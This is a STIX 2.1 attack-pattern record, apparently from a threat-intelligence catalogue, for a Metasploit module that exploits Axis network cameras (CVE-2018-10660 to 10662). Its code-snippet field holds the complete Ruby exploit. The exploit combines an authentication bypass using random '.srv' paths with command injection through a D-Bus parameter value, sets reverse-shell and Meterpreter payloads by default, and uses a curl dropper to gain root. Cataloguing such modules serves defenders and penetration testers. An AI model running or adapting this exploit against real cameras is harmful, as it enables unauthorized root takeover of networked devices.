{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24e153a8-8bf4-48cb-8987-4e807160f54f",
    "created": "2024-08-14T17:01:14.106009Z",
    "modified": "2024-08-14T17:01:14.106014Z",
    "name": "Axis Network Camera .srv-to-parhand RCE",
    "description": " This module exploits an auth bypass in .srv functionality and a command injection in parhand to execute code as the root user. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/axis_srv_parhand_rce.rb",
            "external_id": "axis_srv_parhand_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-10660"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-10661"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-10662"
        },
        {
            "source_name": "reference",
            "url": "https://blog.vdoo.com/2018/06/18/vdoo-discovers-significant-vulnerabilities-in-axis-cameras/"
        },
        {
            "source_name": "reference",
            "url": "https://www.axis.com/files/faq/Advisory_ACV-128401.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'                => 'Axis Network Camera .srv-to-parhand RCE',\n      'Description'         => %q{\n        This module exploits an auth bypass in .srv functionality and a\n        command injection in parhand to execute code as the root user.\n      },\n      'Author'              => [\n        'Or Peles',       # Vulnerability discovery (VDOO)\n        'wvu',            # Metasploit module\n        'sinn3r',         # Metasploit module\n        'Brent Cook',     # Metasploit module\n        'Jacob Robles',   # Metasploit module\n        'Matthew Kienow', # Metasploit module\n        'Shelby Pace',    # Metasploit module\n        'Chris Lee',      # Metasploit module\n        'Cale Black'      # Metasploit module\n      ],\n      'References'          => [\n        ['CVE', '2018-10660'],\n        ['CVE', '2018-10661'],\n        ['CVE', '2018-10662'],\n        ['URL', 'https://blog.vdoo.com/2018/06/18/vdoo-discovers-significant-vulnerabilities-in-axis-cameras/'],\n        ['URL', 'https://www.axis.com/files/faq/Advisory_ACV-128401.pdf']\n      ],\n      'DisclosureDate'      => '2018-06-18',\n      'License'             => MSF_LICENSE,\n      'Platform'            => ['unix', 'linux'],\n      'Arch'                => [ARCH_CMD, ARCH_ARMLE],\n      'Privileged'          => true,\n      'Targets'             => [\n        ['Unix In-Memory',\n          'Platform'        => 'unix',\n          'Arch'            => ARCH_CMD,\n          'Type'            => :unix_memory,\n          'Payload'         => {\n            'BadChars'      => ' ',\n            'Encoder'       => 'cmd/ifs',\n            'Compat'        => {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'netcat-e'\n            }\n          },\n          'DefaultOptions'  => {\n            'PAYLOAD'       => 'cmd/unix/reverse_netcat_gaping'\n          }\n        ],\n        ['Linux Dropper',\n          'Platform'        => 'linux',\n          'Arch'            => ARCH_ARMLE,\n          'Type'            => :linux_dropper,\n          'DefaultOptions'  => {\n            'PAYLOAD'       => 'linux/armle/meterpreter_reverse_tcp'\n          }\n        ]\n      ],\n      'DefaultTarget'       => 1,\n      'DefaultOptions'      => {'WfsDelay' => 10}\n    ))\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri'    => \"/index.html/#{rand_srv}\"\n    )\n\n    if res && res.code == 204\n      return CheckCode::Appears\n    end\n\n    CheckCode::Safe\n  end\n\n  def exploit\n    case target['Type']\n    when :unix_memory\n      execute_command(payload.encoded)\n    when :linux_dropper\n      execute_cmdstager(flavor: :curl, nospace: true)\n    end\n  end\n\n  def execute_command(cmd, opts = {})\n    send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => \"/index.html/#{rand_srv}\",\n      'vars_post' => {\n        'action'  => 'dbus',\n        'args'    => dbus_send(\n          method: :set_param,\n          param:  \"string:root.Time.DST.Enabled string:;(#{cmd})&\"\n        )\n      }\n    )\n\n    send_request_cgi(\n      'method'    => 'POST',\n      'uri'       => \"/index.html/#{rand_srv}\",\n      'vars_post' => {\n        'action'  => 'dbus',\n        'args'    => dbus_send(method: :synch_params)\n      }\n    )\n  end\n\n  def dbus_send(method:, param: nil)\n    args = '--system --dest=com.axis.PolicyKitParhand ' \\\n           '--type=method_call /com/axis/PolicyKitParhand '\n\n    args <<\n      case method\n      when :set_param\n        \"com.axis.PolicyKitParhand.SetParameter #{param}\"\n      when :synch_params\n        'com.axis.PolicyKitParhand.SynchParameters'\n      end\n\n    args\n  end\n\n  def rand_srv\n    \"#{Rex::Text.rand_text_alphanumeric(8..42)}.srv\"\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2018-06-18",
    "x_mitre_platforms": [
        "linux'"
    ]
}